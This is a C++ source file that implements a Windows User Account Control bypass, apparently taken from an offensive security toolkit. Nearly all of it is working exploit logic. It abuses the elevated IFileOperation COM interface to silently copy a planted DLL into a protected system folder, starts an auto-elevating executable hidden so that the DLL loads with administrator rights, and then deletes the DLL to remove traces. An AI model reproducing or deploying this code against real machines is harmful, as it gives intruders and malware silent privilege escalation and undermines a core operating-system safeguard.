#include "Exploit.h"
#include <csignal>


void exploit(LPVOID lpReserved)
{
	paths *p = (paths *)lpReserved;
	const wchar_t *szElevArgs = L"";
	const wchar_t  *szEIFOMoniker = NULL;
	PVOID OldValue = NULL;
	int retry = 5;

	IFileOperation *pFileOp = NULL;
	IShellItem *pSHISource = 0;
	IShellItem *pSHIDestination = 0;
	IShellItem *pSHIDelete = 0;

	const IID *pIID_EIFO = &__uuidof(IFileOperation);
	const IID *pIID_EIFOClass = &__uuidof(FileOperation);
	const IID *pIID_ShellItem2 = &__uuidof(IShellItem2);

	dprintf("[BYPASSUAC_INJECTION] szElevDir %p", &(p->szElevDir));
	OutputDebugStringW(p->szElevDir);
	dprintf("[BYPASSUAC_INJECTION] szElevDll %p", &(p->szElevDll));
	OutputDebugStringW(p->szElevDll);
	dprintf("[BYPASSUAC_INJECTION] szElevDllFull %p", &(p->szElevDllFull));
	OutputDebugStringW(p->szElevDllFull);
	dprintf("[BYPASSUAC_INJECTION] szElevDllFull_syswow64 %p", &(p->szElevDllFull_syswow64));
	OutputDebugStringW(p->szElevDllFull_syswow64);
	dprintf("[BYPASSUAC_INJECTION] szElevExeFull %p", &(p->szElevExeFull));
	OutputDebugStringW(p->szElevExeFull);
	dprintf("[BYPASSUAC_INJECTION] path %p", &(p->path));
	OutputDebugStringW(p->path);

	if (CoInitialize(NULL) == S_OK)
	{	
		if (CoCreateInstance(*pIID_EIFOClass, NULL, CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER, *pIID_EIFO, (void**) &pFileOp) == S_OK)
		{
			if (pFileOp->SetOperationFlags(FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION) == S_OK)
			{
				if (SHCreateItemFromParsingName((PCWSTR) p->path, NULL, *pIID_ShellItem2, (void**) &pSHISource) == S_OK)
				{
					if (SHCreateItemFromParsingName(p->szElevDir, NULL, *pIID_ShellItem2, (void**) &pSHIDestination) == S_OK)
					{
						if (pFileOp->CopyItem(pSHISource, pSHIDestination, p->szElevDll, NULL) == S_OK)
						{
							/* Copy the DLL file to the target folder*/
							if (pFileOp->PerformOperations() == S_OK)
							{
								dprintf("[BYPASSUAC_INJECTION] DLL copied to target directory");
								/* Execute target executable */
								SHELLEXECUTEINFOW shinfo;
								ZeroMemory(&shinfo, sizeof(shinfo));
								shinfo.cbSize = sizeof(shinfo);
								shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
								shinfo.lpFile = p->szElevExeFull;
								shinfo.lpParameters = szElevArgs;
								shinfo.lpDirectory = p->szElevDir;
								shinfo.nShow = SW_HIDE;

								Wow64DisableWow64FsRedirection(&OldValue);
								if (ShellExecuteExW(&shinfo) && shinfo.hProcess != NULL)
								{
									dprintf("[BYPASSUAC_INJECTION] Executable started waiting for it to exit...");
									WaitForSingleObject(shinfo.hProcess, 10000);
									CloseHandle(shinfo.hProcess);
								}

								if (S_OK == SHCreateItemFromParsingName(p->szElevDllFull, NULL, *pIID_ShellItem2, (void**)&pSHIDelete))
								{
									if (0 != pSHIDelete)
									{
										if (S_OK == pFileOp->DeleteItem(pSHIDelete, NULL))
										{
											dprintf("[BYPASSUAC_INJECTION] Deleting DLL in target directory");
											OutputDebugStringW(p->szElevDllFull);
											if (pFileOp->PerformOperations() != S_OK)
											{
												dprintf("[BYPASSUAC_INJECTION] Failed to delete DLL in target directory");
												// If we fail to delete the file probably SYSWOW64 process so use SYSNATIVE to get the correct path
												// DisableWOW64Redirect fails at this? Possibly due to how it interacts with UAC see:
												// http://msdn.microsoft.com/en-us/library/windows/desktop/aa384187(v=vs.85).aspx
												if (S_OK == SHCreateItemFromParsingName(p->szElevDllFull_syswow64, NULL, *pIID_ShellItem2, (void**)&pSHIDelete))
												{
													if (0 != pSHIDelete)
													{
														if (S_OK == pFileOp->DeleteItem(pSHIDelete, NULL))
														{
															dprintf("[BYPASSUAC_INJECTION] Deleting DLL in target directory from SYSWOW64 process");
															if (pFileOp->PerformOperations() == S_OK)
															{
																dprintf("[BYPASSUAC_INJECTION] Successfully deleted DLL in target directory from SYSWOW64 process");
															}
															else {
																dprintf("[BYPASSUAC_INJECTION] Failed to delete target DLL");
															}

														}
													}
												}
											}
											else {
												dprintf("[BYPASSUAC_INJECTION] Successfully deleted DLL in target directory");
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}
